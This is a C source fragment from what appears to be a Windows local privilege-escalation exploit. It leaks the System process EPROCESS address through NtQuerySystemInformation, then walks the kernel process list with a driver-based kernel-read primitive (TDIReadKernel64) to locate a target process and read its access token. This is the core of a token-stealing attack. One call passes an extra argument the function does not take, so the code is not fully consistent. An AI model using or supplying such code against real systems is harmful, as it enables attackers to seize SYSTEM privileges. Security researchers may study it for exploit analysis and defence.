BOOL GetSystemEproc(DWORD64 * obj) {
	BOOL result = FALSE;
	NTSTATUS status;
	ULONG handleInfoSize = 0x10000;
	HANDLE hHeap = GetProcessHeap();
	//int process_count = 0;
	//_SYSTEM_INFORMATION_CLASS systemClassInfo = SystemHandleInformation;
	PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
    // NtQuerySystemInformation won't give us the correct buffer size,
    //  so we guess by doubling the buffer size.
	NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	// Create an array of Process using the Process linked list to be stored in "handleInfo"
	while ((status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
											handleInfo,
											handleInfoSize,
											NULL)) == STATUS_INFO_LENGTH_MISMATCH)
			handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

    if (status != 0) {
        PRINT("[!] NtQuerySystemInformation failed!\n");
        result = FALSE;
		return result;
    }
	
	// get first entry from the table, which points to System(4) process
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = handleInfo->Handles[0]; // the very first Process in the Linked list is the System.exe process
	if (handle.UniqueProcessId == 4) {
		PRINT("PID: %d ; Object: 0x%p\n", handle.UniqueProcessId, handle.Object);
		*obj = (DWORD64) handle.Object;
		free(handleInfo);
		result = TRUE;
	} else
		result = FALSE;
	
	PRINT("[+] Successfully extracted the SYSTEM process EPROC address!\n");
	
	return result;
}


BOOL GetEprocByPid(HANDLE Device, int pid, DWORD64 * obj) {
	PRINT("Inside GetEprocByPid..\n");
	// get object offsets for the running Windows version
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			PRINT("[!] Error getting Windows offsets!\n");
			return FALSE;
		}

	// get System(4) EPROCESS object address
	DWORD64 SystemProcessAddress = NULL;
	if (!GetSystemEproc(&SystemProcessAddress)) {
		PRINT("[!] Error getting System process EPROCESS object!\n");
		return FALSE;
	}

	// iterate over all processes and find the one belonging to the target pid
	DWORD64 TargetPID = pid;
	DWORD64 ProcessHead = SystemProcessAddress + g_ObjOffsets.EPROC_ActiveProcessLinks;
	DWORD64 TempEProcAddress = ProcessHead - g_ObjOffsets.EPROC_ActiveProcessLinks;  // Temporary address for the System.exe process (EPROC)
	DWORD64 TempPID = 0;
	BOOL r = TDIReadKernel64(Device, TempEProcAddress + g_ObjOffsets.EPROC_UniqueProcessId, &TempPID);
	if (!r) return r;

	while (TempPID != TargetPID) {		// search until we find the target PID
		DWORD64 TempLink = 0;
		// get the next object
		r = TDIReadKernel64(Device, TempEProcAddress + g_ObjOffsets.EPROC_ActiveProcessLinks, &TempLink);
		if (!r) return r;

		// calculate its EPROCESS address
		TempEProcAddress = TempLink - g_ObjOffsets.EPROC_ActiveProcessLinks;
		if (TempEProcAddress == ProcessHead)	// (shouldn't happen) break the loop if we searched all the processes
			return FALSE;
		// get the current object's PID
		r = TDIReadKernel64(Device, TempEProcAddress + g_ObjOffsets.EPROC_UniqueProcessId, &TempPID);
		if (!r) return r;
	}

	// return the EPROCESS address
	*obj = TempEProcAddress;

	return TRUE;
}


BOOL GetTokenByPID(HANDLE Device, int tPID, DWORD64 * Token) {
	// 1. Determine which Windows version we're running on
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			PRINT("[!] Error getting Windows offsets!\n");
			return FALSE;
		}	
	
	// 2. Get target process EPROCESS address
	DWORD64 TargetProcessAddress = NULL;
	if (!GetEprocByPid(Device, tPID, &TargetProcessAddress,g_ObjOffsets))
		return FALSE;	
	PRINT("[+] Target EPROCESS address: %p\n", TargetProcessAddress);

	// 3. Get target process token
	DWORD64 TargetToken = 0;
	if (!TDIReadKernel64(Device, TargetProcessAddress + g_ObjOffsets.EPROC_Token, &TargetToken))
		return FALSE;
	TargetToken = TargetToken & ~0xf;  // gets rid of the reference count
	PRINT("[+] Target process token: %p\n", TargetToken);

	*Token = TargetToken;	
	return TRUE;
}
